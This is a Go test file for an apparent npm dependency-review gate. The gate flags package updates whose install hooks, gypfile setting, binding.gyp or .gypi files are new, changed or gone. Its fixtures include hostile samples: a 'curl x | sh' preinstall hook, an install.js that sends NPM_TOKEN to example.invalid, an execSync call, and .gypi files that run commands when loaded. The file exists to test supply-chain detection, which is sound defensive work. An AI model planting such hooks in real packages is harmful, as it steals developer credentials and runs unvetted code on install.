package npm

import (
	"encoding/json/jsontext"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/sadbox/dep-review/internal/allow"
	"github.com/sadbox/dep-review/internal/artifact"
)

func TestReadHooks(t *testing.T) {
	tests := []struct {
		name, scripts string
		// want is the hooks as showHooks renders them; "error" for a
		// value that hides what would run.
		want string
	}{
		{"absent", ``, "none"},
		{"null", `null`, "none"},
		{"empty", `{}`, "none"},
		{"only other scripts", `{"test":"mocha","build":"tsc","prepare":"husky","prepublishOnly":"x"}`, "none"},
		{"postinstall", `{"postinstall":"node install.js"}`, `postinstall: "node install.js"`},
		{"all three", `{"preinstall":"a","install":"b","postinstall":"c"}`, `install: "b", postinstall: "c", preinstall: "a"`},
		{"an empty script is no script", `{"install":""}`, "none"},
		{"a null script is no script", `{"install":null}`, "none"},
		{"hook names are case sensitive", `{"PostInstall":"x","POSTINSTALL":"y"}`, "none"},
		{"a script that is a list", `{"install":["a"]}`, "error"},
		{"a script that is a number", `{"postinstall":1}`, "error"},
		{"a script that is an object", `{"preinstall":{"run":"x"}}`, "error"},
		{"scripts that is a string", `"node install.js"`, "error"},
		{"scripts that is a list", `["postinstall"]`, "error"},
		{"scripts that is true", `true`, "error"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hooks, err := readHooks(jsontext.Value(tt.scripts))
			got := "error"
			if err == nil {
				got = showHooks(hooks)
			}
			if got != tt.want {
				t.Errorf("readHooks(%s) = %s (%v), want %s", tt.scripts, got, err, tt.want)
			}
		})
	}
}

// The tarballs' own word on the install step (spec section 11, amendments
// 5, 25 and 58): for every package.json in the new tarball, bundled
// packages included, the install scripts, "gypfile" and the binding.gyp
// beside it are the old tarball's at the same path, and absent where it
// has none; and every .gypi file is the same file in both.
func TestInspectTarballs(t *testing.T) {
	const plain = `{"name":"a","version":"1.0.0","scripts":{"test":"mocha"}}`
	const next = `{"name":"a","version":"1.1.0","scripts":{"test":"mocha"}}`
	const withScript = `{"name":"a","version":"1.0.0","scripts":{"postinstall":"node install.js"}}`
	// What a package that builds itself looks like (@parcel/watcher has
	// an install script beside its binding.gyp).
	const building = `{"name":"a","version":"1.0.0","scripts":{"install":"node scripts/build-from-source.js"}}`
	// A package that ships a binding.gyp and tells npm not to build it.
	const prebuilt = `{"name":"a","version":"1.0.0","gypfile":false}`
	const gyp = `{"targets":[{"target_name":"a","sources":["src/a.cc"]}]}`
	// A .gypi that runs a command while gyp loads it.
	const gypi = `{"variables":{"made":"<!(node -e \"require('./tools/make')\")"}}`
	const inner = "node_modules/inner/package.json"
	const innerGyp = "node_modules/inner/binding.gyp"
	bump := func(manifest string) string { return strings.Replace(manifest, "1.0.0", "1.1.0", 1) }
	// pkg is an extracted package: its package.json, and then pairs of
	// path and content.
	pkg := func(manifest string, more ...string) fs.FS {
		m := fstest.MapFS{"package.json": {Data: []byte(manifest)}, "index.js": {Data: []byte("module.exports = 1\n")}}
		for i := 0; i+1 < len(more); i += 2 {
			m[more[i]] = &fstest.MapFile{Data: []byte(more[i+1])}
		}
		return m
	}
	const (
		yes     = "yes"
		no      = "no"
		unknown = "never gathered"
	)
	tests := []struct {
		name     string
		old, new fs.FS
		state    string
		want     string // a piece of the Value
	}{
		// The three inputs are the old tarball's, or absent on both sides.
		{"no install step on either side", pkg(plain), pkg(next), yes, "no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone in 1 package.json (0 binding.gyp and .gypi files present); the other files these run were not compared"},
		{"a new name with no install step", nil, pkg(plain), yes, "in 1 package.json (0 binding.gyp and .gypi files present)"},
		{"the same script on both sides", pkg(withScript), pkg(withScript), yes, "in 1 package.json"},
		{"the same script, another version field", pkg(withScript), pkg(bump(withScript)), yes, "in 1 package.json"},
		{"a script and binding.gyp on both sides", pkg(withScript, "binding.gyp", "{}"), pkg(bump(withScript), "binding.gyp", "{}"), yes, "(1 binding.gyp and .gypi files present)"},
		{"an install script and a binding.gyp, both unchanged in a new version", pkg(building, "binding.gyp", gyp), pkg(bump(building), "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
		{"a binding.gyp and no script on either side", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
		{"gypfile false beside a binding.gyp on both sides", pkg(prebuilt, "binding.gyp", gyp), pkg(bump(prebuilt), "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},
		{"gypfile true on both sides", pkg(`{"version":"1.0.0","gypfile":true}`, "binding.gyp", gyp), pkg(`{"version":"1.1.0","gypfile":true}`, "binding.gyp", gyp), yes, "(1 binding.gyp and .gypi files present)"},

		// An install script: added, changed or removed.
		{"a hook is added", pkg(plain), pkg(withScript), no, `the install scripts of package.json change from none to postinstall: "node install.js"`},
		{"a hook's text changes", pkg(withScript), pkg(strings.Replace(withScript, "install.js", "other.js", 1)), no, `the install scripts of package.json change from postinstall: "node install.js" to postinstall: "node other.js"`},
		{"a second hook appears", pkg(withScript), pkg(`{"scripts":{"postinstall":"node install.js","preinstall":"curl x | sh"}}`), no, "the install scripts of package.json change"},
		{"a hook is removed", pkg(withScript), pkg(plain), no, `the install scripts of package.json change from postinstall: "node install.js" to none`},
		{"a hook is removed beside a binding.gyp", pkg(withScript, "binding.gyp", gyp), pkg(plain, "binding.gyp", gyp), no, "the install scripts of package.json change"},
		// npm builds a binding.gyp by itself when there is neither an
		// install nor a preinstall script, so removing one starts a build.
		{"the install script is removed and the binding.gyp stays", pkg(building, "binding.gyp", gyp), pkg(plain, "binding.gyp", gyp), no, `the install scripts of package.json change from install: "node scripts/build-from-source.js" to none`},
		{"the preinstall script is removed and the binding.gyp stays", pkg(`{"scripts":{"preinstall":"node check.js"}}`, "binding.gyp", gyp), pkg(`{"scripts":{}}`, "binding.gyp", gyp), no, "the install scripts of package.json change from preinstall: "},
		{"a hook is removed, and the old package.json cannot be read", pkg(`{"scripts":{"install":["x"]}}`, "binding.gyp", gyp), pkg(plain, "binding.gyp", gyp), no, "package.json in the old tarball: the install script is not a string"},
		{"a new name with a script", nil, pkg(withScript), no, "package.json is new and has an install script"},

		// "gypfile": false keeps npm from building a binding.gyp.
		{"gypfile false is removed beside an unchanged binding.gyp", pkg(prebuilt, "binding.gyp", gyp), pkg(`{"name":"a","version":"1.1.0"}`, "binding.gyp", gyp), no, `gypfile of package.json changes from "false" to ""`},
		{"gypfile true is added", pkg(plain), pkg(`{"name":"a","version":"1.1.0","gypfile":true}`), no, `gypfile of package.json changes from "" to "true"`},
		{"gypfile false becomes true", pkg(prebuilt, "binding.gyp", gyp), pkg(strings.Replace(prebuilt, "false", "true", 1), "binding.gyp", gyp), no, `gypfile of package.json changes from "false" to "true"`},
		{"gypfile false is added", pkg(plain), pkg(bump(prebuilt)), no, `gypfile of package.json changes from "" to "false"`},
		{"gypfile false becomes null", pkg(prebuilt), pkg(strings.Replace(prebuilt, "false", "null", 1)), no, `gypfile of package.json changes from "false" to "null"`},
		{"a new name that sets gypfile", nil, pkg(prebuilt), no, "package.json is new and sets gypfile"},

		// A binding.gyp: new, changed or gone.
		{"binding.gyp appears", pkg(plain), pkg(plain, "binding.gyp", "{}"), no, "binding.gyp is new"},
		{"binding.gyp appears next to an old script", pkg(withScript), pkg(withScript, "binding.gyp", "{}"), no, "binding.gyp is new"},
		{"a binding.gyp changes", pkg(plain, "binding.gyp", "{}"), pkg(plain, "binding.gyp", `{"targets":[]}`), no, "binding.gyp changes"},
		{"a binding.gyp changes by one byte beside an unchanged install script", pkg(building, "binding.gyp", gyp), pkg(building, "binding.gyp", gyp+"\n"), no, "binding.gyp changes"},
		{"binding.gyp is removed", pkg(plain, "binding.gyp", "{}"), pkg(plain), no, "binding.gyp is gone, and package.json beside it stays"},
		{"the install script and the binding.gyp are both removed", pkg(building, "binding.gyp", gyp), pkg(plain), no, "binding.gyp is gone"},
		{"a new name with binding.gyp", nil, pkg(plain, "binding.gyp", "{}"), no, "binding.gyp is new"},
		// One with no package.json beside it is compared the same way.
		{"a binding.gyp without a package.json, unchanged", pkg(plain, "addon/binding.gyp", gyp), pkg(next, "addon/binding.gyp", gyp), yes, "in 1 package.json (1 binding.gyp and .gypi files present)"},
		{"a binding.gyp without a package.json, new", pkg(plain), pkg(plain, "addon/binding.gyp", gyp), no, "addon/binding.gyp is new"},
		{"a binding.gyp without a package.json, changed", pkg(plain, "addon/binding.gyp", gyp), pkg(plain, "addon/binding.gyp", gyp+" "), no, "addon/binding.gyp changes"},
		{"a new package.json beside an old binding.gyp", pkg(plain, "addon/binding.gyp", gyp), pkg(plain, "addon/binding.gyp", gyp, "addon/package.json", `{"name":"addon"}`), no, "addon/package.json is new beside a binding.gyp"},

		// A .gypi file is read by gyp as a binding.gyp is: one that a
		// binding.gyp includes, and a config.gypi or common.gypi that
		// node-gyp includes by itself. New, changed or gone, at any depth,
		// it is a change of what the package is built from (spec section
		// 11, amendment 58).
		{"a binding.gyp and a .gypi, both unchanged", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), yes, "(2 binding.gyp and .gypi files present)"},
		{"a config.gypi appears beside an unchanged binding.gyp", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), no, "config.gypi is new: it is a file a package is built from"},
		{"a common.gypi appears beside an unchanged binding.gyp and install script", pkg(building, "binding.gyp", gyp), pkg(bump(building), "binding.gyp", gyp, "common.gypi", gypi), no, "common.gypi is new"},
		{"a .gypi changes", pkg(plain, "binding.gyp", gyp, "config.gypi", "{}"), pkg(next, "binding.gyp", gyp, "config.gypi", gypi), no, "config.gypi changes: it is a file a package is built from"},
		{"a .gypi changes by one byte", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp, "config.gypi", gypi+"\n"), no, "config.gypi changes"},
		{"a .gypi is gone and the binding.gyp stays", pkg(plain, "binding.gyp", gyp, "config.gypi", gypi), pkg(next, "binding.gyp", gyp), no, "config.gypi is gone: it is a file a package is built from"},
		{"a .gypi of any name, in a directory, appears", pkg(plain, "binding.gyp", gyp), pkg(next, "binding.gyp", gyp, "build/flags.gypi", gypi), no, "build/flags.gypi is new"},
		{"a .gypi in a directory changes", pkg(plain, "deps/zlib/zlib.gypi", "{}"), pkg(next, "deps/zlib/zlib.gypi", gypi), no, "deps/zlib/zlib.gypi changes"},
		{"a .gypi in a directory is gone", pkg(plain, "deps/zlib/zlib.gypi", gypi), pkg(next), no, "deps/zlib/zlib.gypi is gone"},
		{"a .gypi with no binding.gyp anywhere appears", pkg(plain), pkg(next, "config.gypi", gypi), no, "config.gypi is new"},
		{"a file named only .gypi appears", pkg(plain), pkg(next, "build/.gypi", gypi), no, "build/.gypi is new"},
		{"a new name with a .gypi", nil, pkg(plain, "config.gypi", gypi), no, "config.gypi is new"},
		{"a bundled package gains a .gypi", pkg(plain, inner, plain, innerGyp, gyp), pkg(next, inner, plain, innerGyp, gyp, "node_modules/inner/common.gypi", gypi), no, "node_modules/inner/common.gypi is new"},
		// A .gypi belongs to no package.json: a binding.gyp anywhere may
		// include it by path, so one that is gone counts wherever it was.
		{"a bundled package is removed with its .gypi", pkg(plain, inner, plain, "node_modules/inner/common.gypi", gypi), pkg(next), no, "node_modules/inner/common.gypi is gone"},
		// Other names are other files: the model reads them.
		{"a .gyp file that is not binding.gyp changes", pkg(plain, "deps/zlib.gyp", "{}"), pkg(next, "deps/zlib.gyp", gyp), yes, "(0 binding.gyp and .gypi files present)"},
		{"names that only look like it", pkg(plain), pkg(next, "config.gypi.txt", gypi, "gypi", gypi, "Binding.GYPI", gypi), yes, "(0 binding.gyp and .gypi files present)"},

		// Bundled dependencies are part of the tarball and are held to
		// the same rule, each at its own path.
		{"declares bundled dependencies and has none with a script", pkg(plain), pkg(`{"bundleDependencies":["inner"]}`, inner, plain), yes, "in 2 package.json"},
		{"a bundled package, the same on both sides", pkg(plain, inner, withScript), pkg(plain, inner, withScript), yes, "in 2 package.json"},
		{"a bundled package that changes without touching its scripts", pkg(plain, inner, withScript), pkg(plain, inner, strings.Replace(withScript, "1.0.0", "2.0.0", 1)), yes, "in 2 package.json"},
		{"a bundled package with a script appears", pkg(plain), pkg(plain, inner, withScript), no, "node_modules/inner/package.json is new and has an install script"},
		{"a bundled package gains a script", pkg(plain, inner, plain), pkg(plain, inner, withScript), no, "the install scripts of node_modules/inner/package.json change from none"},
		{"a bundled package's script changes", pkg(plain, inner, withScript), pkg(plain, inner, strings.Replace(withScript, "install.js", "evil.js", 1)), no, "the install scripts of node_modules/inner/package.json change"},
		{"a bundled package gains a binding.gyp", pkg(plain, inner, plain), pkg(plain, inner, plain, innerGyp, "{}"), no, "node_modules/inner/binding.gyp is new"},
		{"a bundled package's binding.gyp changes", pkg(plain, inner, plain, innerGyp, "{}"), pkg(plain, inner, plain, innerGyp, gyp), no, "node_modules/inner/binding.gyp changes"},
		{"a bundled package's binding.gyp is removed", pkg(plain, inner, plain, innerGyp, gyp), pkg(plain, inner, plain), no, "node_modules/inner/binding.gyp is gone"},
		{"a bundled package drops its install script and keeps its binding.gyp", pkg(plain, inner, building, innerGyp, gyp), pkg(plain, inner, plain, innerGyp, gyp), no, "the install scripts of node_modules/inner/package.json change from install: "},
		{"a bundled package drops gypfile false and keeps its binding.gyp", pkg(plain, inner, prebuilt, innerGyp, gyp), pkg(plain, inner, plain, innerGyp, gyp), no, "gypfile of node_modules/inner/package.json changes"},
		// What is gone with its package.json is not in the new tarball.
		{"a bundled package is removed with its binding.gyp", pkg(plain, inner, building, innerGyp, gyp), pkg(next), yes, "in 1 package.json (0 binding.gyp and .gypi files present)"},
		{"a package bundled two levels down", pkg(plain), pkg(plain, inner, plain, "node_modules/inner/node_modules/deep/package.json", withScript), no, "node_modules/inner/node_modules/deep/package.json is new and has an install script"},
		{"a new name that bundles a package with a script", nil, pkg(plain, inner, withScript), no, "node_modules/inner/package.json is new and has an install script"},
		{"a new name that bundles quiet packages", nil, pkg(plain, inner, plain), yes, "in 2 package.json"},
		// Not only where npm looks: nothing here decides what npm treats
		// as a package.
		{"a package.json with a script in a fixture directory", pkg(plain), pkg(plain, "test/fixture/package.json", withScript), no, "test/fixture/package.json is new and has an install script"},

		// What cannot be read is a no, unless it did not change.
		{"no package.json", pkg(plain), fstest.MapFS{"index.js": {Data: []byte("x")}}, no, "the new tarball has no package.json at its root"},
		{"package.json one level down only", pkg(plain), fstest.MapFS{"package/package.json": {Data: []byte(plain)}}, no, "the new tarball has no package.json at its root"},
		{"package.json is not JSON", pkg(plain), pkg(`{"scripts":`), no, "package.json in the new tarball: not JSON the gate can read"},
		{"package.json has scripts twice", pkg(plain), pkg(`{"scripts":{},"scripts":{"postinstall":"x"}}`), no, "package.json in the new tarball: not JSON the gate can read"},
		{"package.json has gypfile twice", pkg(prebuilt), pkg(`{"gypfile":false,"gypfile":true}`), no, "package.json in the new tarball: not JSON the gate can read"},
		{"a script that is not a string", pkg(plain), pkg(`{"scripts":{"install":["x"]}}`), no, "package.json in the new tarball: the install script is not a string"},
		{"the old package.json is not JSON", pkg(`nope`), pkg(withScript), no, "package.json in the old tarball: not JSON the gate can read"},
		{"a fixture that is not JSON, unchanged", pkg(plain, "test/broken/package.json", "{nope"), pkg(next, "test/broken/package.json", "{nope"), yes, "in 2 package.json"},
		{"a fixture that is not JSON, new", pkg(plain), pkg(plain, "test/broken/package.json", "{nope"), no, "test/broken/package.json in the new tarball: not JSON"},
		{"no new tarball", pkg(plain), nil, unknown, "the new tarball was not given"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := InspectTarballs(tt.old, tt.new)
			state := no
			switch {
			case got.Holds():
				state = yes
			case got.Source == "":
				state = unknown
			}
			if state != tt.state || !strings.Contains(got.Value, tt.want) || got.Unavailable {
				t.Errorf("InspectTarballs = %+v (%s), want %s saying %q", got, state, tt.state, tt.want)
			}
			if state != unknown && got.Source != tarballSource {
				t.Errorf("Source = %q", got.Source)
			}
		})
	}

	// It is what artifact.Inspect asks for, so the fetch command can hand
	// it to the reader as it is.
	var _ artifact.Inspect = InspectTarballs
}

// The comparison stops at what package.json, binding.gyp and the .gypi
// files say. A version that keeps its postinstall command, its
// binding.gyp and its .gypi and rewrites the file the command runs, a
// file the binding.gyp includes under another name and a file one of its
// actions runs still has the fact: those files are in the diff the model
// reads. The Value must say that they were not compared, so "unchanged"
// is not read as covering them. The same version with the .gypi
// rewritten does not have it (spec section 11, amendment 58).
func TestInspectTarballsDoesNotCompareWhatAHookRuns(t *testing.T) {
	const gyp = `{"includes":["common.gypi","build/settings.inc"],"targets":[{"target_name":"a","actions":[{"action_name":"gen","inputs":[],"outputs":["o"],"action":["node","gen.js"]}]}]}`
	tarball := func(version, installJS, gypi, inc, genJS string) fs.FS {
		return fstest.MapFS{
			"package.json":       {Data: []byte(`{"name":"a","version":"` + version + `","scripts":{"postinstall":"node install.js"},"gypfile":true}`)},
			"binding.gyp":        {Data: []byte(gyp)},
			"install.js":         {Data: []byte(installJS)},
			"common.gypi":        {Data: []byte(gypi)},
			"build/settings.inc": {Data: []byte(inc)},
			"gen.js":             {Data: []byte(genJS)},
		}
	}
	const command = `{"variables":{"x":"<!(node -e \"more()\")"}}`
	old := tarball("1.0.0", "console.log('built')\n", "{}", "{}", "// writes o\n")
	rewritten := tarball("1.0.1", "require('https').get('https://example.invalid/' + process.env.NPM_TOKEN)\n",
		"{}", command, "require('child_process').execSync('id')\n")

	got := InspectTarballs(old, rewritten)
	if !got.Holds() {
		t.Fatalf("InspectTarballs = %+v: the rule compares hook commands, gypfile, binding.gyp and .gypi files, and all are the old tarball's", got)
	}
	if !strings.Contains(got.Value, "no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone") || !strings.Contains(got.Value, "the other files these run were not compared") {
		t.Errorf("Value = %q, want it to name what was compared and to say the other files these run were not", got.Value)
	}

	// The file the binding.gyp includes as a .gypi is compared.
	included := tarball("1.0.1", "console.log('built')\n", command, "{}", "// writes o\n")
	if got := InspectTarballs(old, included); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "common.gypi changes") {
		t.Errorf("InspectTarballs = %+v, want a no for the .gypi that gained a command", got)
	}
}

// The fetch command ANDs the tarballs' answer into the registry's. The
// result is never better than either, and an update whose tarballs were
// not inspected does not keep a NoRegress that holds.
func TestInspectTarballsIsAndedIn(t *testing.T) {
	registry := allow.Yes("no install script; the old version has no provenance to lose, by the registry's metadata and the lock", "registry and package-lock.json")
	plain := fstest.MapFS{"package.json": {Data: []byte(`{"name":"a"}`)}}
	scripted := fstest.MapFS{"package.json": {Data: []byte(`{"scripts":{"install":"x"}}`)}}

	if got := registry.And(InspectTarballs(plain, plain)); !got.Holds() || !strings.Contains(got.Value, "by the registry's metadata and the lock; no install hook command, gypfile, binding.gyp or .gypi file is new, changed or gone") || !strings.Contains(got.Source, tarballSource) {
		t.Errorf("both hold: %+v", got)
	}
	if got := registry.And(InspectTarballs(plain, scripted)); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "install scripts of package.json change") {
		t.Errorf("the tarball says no: %+v", got)
	}
	// No read was prepared, so nothing inspected: the zero Fact.
	if got := registry.And(allow.Fact{}); got.Holds() || got.Gathered() || got.Unavailable {
		t.Errorf("not inspected: %+v, want it never gathered", got)
	}
	// The tarball could not be downloaded this time.
	if got := registry.And(allow.Unavailable("the registry did not answer", "artifact")); got.Holds() || !got.Unavailable {
		t.Errorf("download failed: %+v, want it unavailable", got)
	}
	for _, worse := range []allow.Fact{allow.No("install scripts change", "registry"), {Value: "the registry's answer could not be used"}} {
		if got := worse.And(InspectTarballs(plain, plain)); got != worse {
			t.Errorf("a fact that did not hold was changed: %+v -> %+v", worse, got)
		}
	}
}

// TestInspectTarballsOnDisk runs the check the way the artifact reader
// does: on an os.Root's file system.
func TestInspectTarballsOnDisk(t *testing.T) {
	write := func(files map[string]string) fs.FS {
		dir := t.TempDir()
		for name, content := range files {
			if err := os.MkdirAll(filepath.Dir(filepath.Join(dir, name)), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		root, err := os.OpenRoot(dir)
		if err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { root.Close() })
		return root.FS()
	}
	plain := map[string]string{"package.json": `{"name":"a"}`, "node_modules/b/package.json": `{"name":"b"}`}
	if got := InspectTarballs(write(plain), write(plain)); !got.Holds() || !strings.Contains(got.Value, "in 2 package.json") {
		t.Errorf("two plain packages: %+v", got)
	}
	gyp := map[string]string{"package.json": `{"name":"a"}`, "node_modules/b/package.json": `{"name":"b"}`, "node_modules/b/binding.gyp": "{}"}
	if got := InspectTarballs(write(plain), write(gyp)); got.Holds() || !strings.Contains(got.Value, "node_modules/b/binding.gyp is new") {
		t.Errorf("a new bundled binding.gyp on disk: %+v", got)
	}
	// The old tree is walked too, for a .gypi that is gone.
	gypi := map[string]string{"package.json": `{"name":"a"}`, "node_modules/b/package.json": `{"name":"b"}`, "node_modules/b/build/config.gypi": "{}"}
	if got := InspectTarballs(write(gypi), write(gypi)); !got.Holds() || !strings.Contains(got.Value, "(1 binding.gyp and .gypi files present)") {
		t.Errorf("an unchanged .gypi on disk: %+v", got)
	}
	if got := InspectTarballs(write(gypi), write(plain)); got.Holds() || !got.Gathered() || !strings.Contains(got.Value, "node_modules/b/build/config.gypi is gone") {
		t.Errorf("a .gypi that is gone on disk: %+v", got)
	}
}
